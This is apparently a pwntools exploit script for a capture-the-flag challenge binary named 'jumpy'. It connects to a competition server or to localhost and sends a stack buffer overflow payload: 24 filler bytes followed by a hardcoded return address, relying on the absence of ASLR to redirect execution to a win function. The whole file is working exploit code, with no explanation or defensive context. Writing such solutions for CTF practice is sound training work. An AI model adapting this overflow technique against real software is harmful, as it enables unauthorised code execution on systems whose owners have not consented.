from pwn import *
import time
context(arch='amd64', os='linux')
context.log_level = True
binary      = ELF('jumpy')
competition = True

if competition:
    conn = remote("wcscctf.org", 8484)
else:
    conn = remote('localhost', 1234)


def getInput():
    print conn.recvline()

def sendPayload():
    #no aslr
    winAddress = p64(0x400636)

    filler   =   'a'*24
    payload  =   filler + winAddress
    with open('payload', 'w') as f:
        f.write(payload)



    conn.sendline(payload)
    time.sleep(1)

    print conn.recvline() + conn.recvline()




if __name__ == "__main__":
    getInput()
    sendPayload()
